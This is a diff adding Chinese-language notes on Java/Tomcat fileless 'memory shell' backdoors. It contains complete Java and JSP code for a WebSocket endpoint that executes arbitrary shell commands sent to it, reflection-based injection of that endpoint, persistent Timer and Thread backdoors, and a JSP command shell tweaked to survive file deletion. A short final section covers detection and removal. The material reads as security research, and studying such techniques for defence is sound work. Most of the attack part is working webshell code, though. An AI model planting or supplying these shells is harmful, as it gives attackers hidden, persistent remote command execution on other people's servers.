@@ -30,6 +30,28 @@
       - [ContainerBase#addValve](#containerbaseaddvalve)
       - [实现思路](#实现思路-3)
       - [实现代码](#实现代码-4)
+    - [Tomcat WebSocket](#tomcat-websocket)
+      - [生命周期](#生命周期)
+      - [使用方式](#使用方式)
+        - [注解](#注解)
+        - [继承](#继承)
+      - [实现思路](#实现思路-4)
+      - [实现代码](#实现代码-5)
+  - [JAVA Agent](#java-agent)
+  - [Timer](#timer)
+    - [实现思路](#实现思路-5)
+    - [实现代码](#实现代码-6)
+  - [Thread](#thread)
+    - [实现代码](#实现代码-7)
+  - [JSP](#jsp)
+    - [实现思路](#实现思路-6)
+    - [实现代码](#实现代码-8)
+  - [查杀](#查杀)
+    - [检查防御](#检查防御)
+      - [Hook动态添加调用](#hook动态添加调用)
+      - [Dump Class](#dump-class)
+      - [Agent马](#agent马)
+    - [清除](#清除)
   - [参考](#参考)
 
 # MemoryShell
@@ -687,10 +709,272 @@ public class EvilValve implements Valve {
 ```  
 ![](2023-01-31-11-34-49.png)  
 ![](2023-01-31-11-35-00.png)
+### Tomcat WebSocket
+WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据,将通信端点抽象成类，就是Endpoint,在Tomcat中也实现了对Websocket协议的支持.在7.0.47以前,Tomcat使用的是自己的相关标准,在之后则是使用的JSR356标准,而JSR356标准即Websocket的编程规范.  
+
+Tomcat在启动时会StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类调用addEndpoint方法加入websocket服务.  
+![](2023-02-06-17-22-00.png)  
+而sc即是WsServerContainer对象.
+#### 生命周期
+在WebSocket进行信息通信的过程中有以下几个生命周期.  
+* @OnOpen 建立连接时触发。
+* @OnClose 关闭连接时触发。
+* @OnError 发生异常时触发。
+* @OnMessage 接收到消息时触发。  
+  
+而我们注入内存马的地方就是重写其中的方法来执行shell代码.
+#### 使用方式
+在Tomcat中有两种方式定义一个处理WebSocket协议的类,一是通过`@ServerEndpoint`注解,二是实现一个继承于Endpoint类的子类. 
+##### 注解  
+注解方法官方参考:https://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpoint.html    
+一个@ServerEndpoint注解应该有以下元素：
+
+* value：必要，String类型，此Endpoint部署的URI路径。
+* configurator：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。
+* decoders：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。
+* encoders：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。
+subprotocols：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。
+
+##### 继承
+继承于Endpoint类的子类的方式需要重写几个生命周期方法,比注解更麻烦.
+#### 实现思路
+实现的思路类似,获取到WsServerContainer对象,调用其addEndpoint方法将我们的恶意Endpoint添加进去即可.
+#### 实现代码
+```java
+package org.example.Servlets;
+
+
+import javax.websocket.OnMessage;
+import javax.websocket.Session;
+import javax.websocket.server.ServerEndpoint;
+import java.io.IOException;
+import java.util.Scanner;
+
+
+@ServerEndpoint("/ws/shell")
+public class EvilEndpoint {
+    @OnMessage
+    public void processGreeting(String message, Session session) throws IOException {
+        if (message != null) {
+            String o = "";
+            ProcessBuilder p;
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                p = new ProcessBuilder("cmd.exe", "/c", message);
+            } else {
+                p = new ProcessBuilder("/bin/sh", "-c", message);
+            }
+            Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
+            o = c.hasNext() ? c.next() : o;
+            c.close();
+            session.getBasicRemote().sendText(o);
+        } else {
+            session.getBasicRemote().sendText("404");
+        }
+    }
+}
+
+```
+```java
+package org.example.Servlets;
+
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.ServletContext;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.websocket.DeploymentException;
+import javax.websocket.server.ServerContainer;
+import java.io.IOException;
+import java.lang.reflect.Field;
+
+public class WebSocketServlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        ServletContext servletContext = req.getServletContext();
+        StandardContext standardContext = null;
+        while (standardContext ==null) {
+            try {
+                Field f = servletContext.getClass().getDeclaredField("context");
+                f.setAccessible(true);
+                Object ob = f.get(servletContext);
+                if (ob instanceof ServletContext) {
+                    servletContext = (ServletContext) ob;
+                } else if (ob instanceof StandardContext) {
+                    standardContext = (StandardContext) ob;
+                }
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        ServerContainer container = (ServerContainer)servletContext.getAttribute(ServerContainer.class.getName());
+        try {
+            container.addEndpoint(EvilEndpoint.class);
+            resp.getWriter().println("Inject WebSocket Shell success");
+        } catch (DeploymentException e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
+
+```
+![](2023-02-06-17-10-40.png)  
+## JAVA Agent
+利用Instrumentation提供的retransform或redefine来动态修改JVM中class,实现在一些通用class中修改字节码插入自己的恶意代码,原理和手法其实和RASP的实现一样,只不过hook的时候植入的代码不再是检测代码而是恶意代码,但这种方法相比于其它方法不确定性较高,因为如果代码有问题和环境不兼容的话可能直接导致环境挂掉.   
+## Timer
+java.util.Timer类是java中的一个定时器类,每一个定时器类对象都对应一个后台的线程,用于执行定时器类中的队列任务,所以利用该类则也可以创建一种在后台持续执行的后门.  
+![](2023-02-07-14-23-14.png)  
+通过其构造函数可以发现可以创建使用守护线程或者非守护线程的计时器对象,通过创建一个非守护线程来执行恶意代码,那么就算用来注入的servlet或者jsp文件被杀掉了,执行恶意代码的Timer对象仍然在后台继续运行.   
+通过Timer对象的schdule方法就可以传入一个TimerTask类对象在指定的时间后执行,其有几个重载方法,通过指定第三个period参数即可实现重复执行的效果.  
+![](2023-02-07-14-47-48.png)  
+而TimerTask是一个接口,我们只要实现其run方法加入恶意代码即可.  
+![](2023-02-07-14-48-49.png)  
+### 实现思路
+1. 实现一个TimerTask子类,在run方法中植入恶意代码.
+2. 创建非守护线程的Timer对象,调用schdule方法指定恶意的TimerTask子类.
+3. 恶意代码在后台的单独线程中持续执行直到JVM退出或调用cancel方法取消.
+### 实现代码
+```java
+package org.example.Servlets;
+
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.util.TimerTask;
+
+public class TimerServlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        java.util.Timer executeSchedule = new java.util.Timer("shellTimer",false);
+        TimerTask timerTask = new TimerTask() {
+            @Override
+            public void run() {
+                        try {
+                            Runtime.getRuntime().exec("calc.exe");
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                    }
+                }
+            };
+        executeSchedule.schedule(timerTask,0,10000);
+    }
+}
+```
+动态获取命令参数思路可以考虑从线程中获取request请求,获取指定header的参数值,执行命令.
+## Thread
+从Timer内存马的思路中其实可以看到实质就是在后台单独起了一个非守护线程,在后台独立运行,将shell代码从当前的servlet中脱离出去,所以线程类内存马的思路其实直接创建一个单独的非守护线程执行恶意代码或者创建一个与jvm主线程绑定的守护线程即可.
+### 实现代码
+```java
+package org.example.Servlets;
+
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+
+public class ThreadServlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        ThreadGroup group = Thread.currentThread().getThreadGroup();
+        while (!group.getName().equals("system")) {
+            group = group.getParent();
+        }
+        Thread d = new Thread(group, new Runnable() {
+            public void run() {
+                while (true) {
+                    try {
+                        Runtime.getRuntime().exec("calc.exe");
+                        Thread.sleep(100);
+                    } catch (Exception ignored) {
+                    }
+                }
+            }
+        }, "shell Thread", 0);
+        d.setDaemon(true);
+        d.start();
+    }
+}
+
+```
+## JSP  
+JSP文件作为一种特殊的servlet,其执行的过程比正常的servlet要多一些步骤,在请求jsp文件时,首先tomcat会查看该jsp是否被编译,如果没有的话则将jsp中的代码编译为class文件,然后会存放一组路径和该class文件中的servlet处理的映射关系在Context中,后续再次请求该Jsp文件时,则检查jsp文件是否存在是否被修改需要重新编译,然后再执行对应的servlet逻辑.  
+而Jsp内存马的思路就是即使jsp文件被删除,但我们仍然能够通过该jsp的路径执行其中的sevlet代码
+### 实现思路
+通过jsp的执行过程可以有以下思路.
+* 让tomcat接受到请求后不去检查JSP文件是否存在.
+* 让tomcat接受到请求后认为jsp文件没有发生任何改变.  
+
+细节可参考:  
+https://xz.aliyun.com/t/10372#toc-3  
+https://www.anquanke.com/post/id/224698#h2-0  
+### 实现代码
+```jsp
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.mapper.MappingData" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="org.apache.jasper.EmbeddedServletOptions" %>
+<%
+    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    InputStream in = process.getInputStream();
+    int a = 0;
+    byte[] b = new byte[1024];
+
+    while ((a = in.read(b)) != -1) {
+        out.println(new String(b, 0, a));
+    }
+
+    in.close();
+
+    //从request对象中获取request属性
+    Field requestF = request.getClass().getDeclaredField("request");
+    requestF.setAccessible(true);
+    Request req = (Request) requestF.get(request);
+    //获取MappingData
+    MappingData mappingData = req.getMappingData();
+    //获取Wrapper
+    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
+    wrapperF.setAccessible(true);
+    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
+    //获取jspServlet对象
+    Field instanceF = wrapper.getClass().getDeclaredField("instance");
+    instanceF.setAccessible(true);
+    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
+    //获取options中保存的对象
+    Field Option = jspServlet.getClass().getDeclaredField("options");
+    Option.setAccessible(true);
+    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);
+    //设置development属性为false
+    Field Developent = op.getClass().getDeclaredField("development");
+    Developent.setAccessible(true);
+    Developent.set(op, false);
+%>
+```
+## 查杀
+直到各种内存马的原理,查杀的思路就是针对各种类型的内存马检查其修该的属性或者字节码是否异常结合内存马无文件的特性查看是否有对应的class文件进行人工判断,
+### 检查防御 
+#### Hook动态添加调用
+对容器提供的动态添加特性方法进行Hook检测,但该思路容易被绕过,很多时候注入内存马的时候可以直接通过反射来修改最后相关的属性值,而不是必须调用容器提供的方法,但可以考虑对关键属性进行监听(比如Servlet内存马会修改servletContext属性,Filter等类似).
+#### Dump Class  
+针对Servlet和Filter,Listener内存马的思路即是遍历出内存中StandardContext存储的所有Filter和Servlet,Listener根据内存马没有文件的特性或者是通过漏洞注入的话ClassLoader不是常规ClassLoader来排查.  
+参考: https://github.com/c0ny1/java-memshell-scanner  
+#### Agent马
+通过sa-jdi.jar可以得到被加载并被java Instrumentation修改后的类,然后将其dump到class文件中进行分析.  
+### 清除
+非Agent马:从系统中移除该对象。  
+针对Agent内存马:通过javaassist来得到磁盘上被修改类的原Class文件,同样利用Agent技术将相关字节码进行还原即可.  
+
 ## 参考
 https://su18.org/post/memory-shell/  
 https://su18.org/post/memory-shell-2/  
 https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ  
 https://xz.aliyun.com/t/7388  
 https://www.anquanke.com/post/id/198886#h2-14  
-https://www.cnblogs.com/coldridgeValley/p/5816414.html
+https://www.cnblogs.com/coldridgeValley/p/5816414.html  
+https://xz.aliyun.com/t/11566#toc-1  
+https://github.com/veo/wsMemShell  
+https://xz.aliyun.com/t/10372  
+https://www.anquanke.com/post/id/224698  
+https://mp.weixin.qq.com/s/Whta6akjaZamc3nOY1Tvxg#at
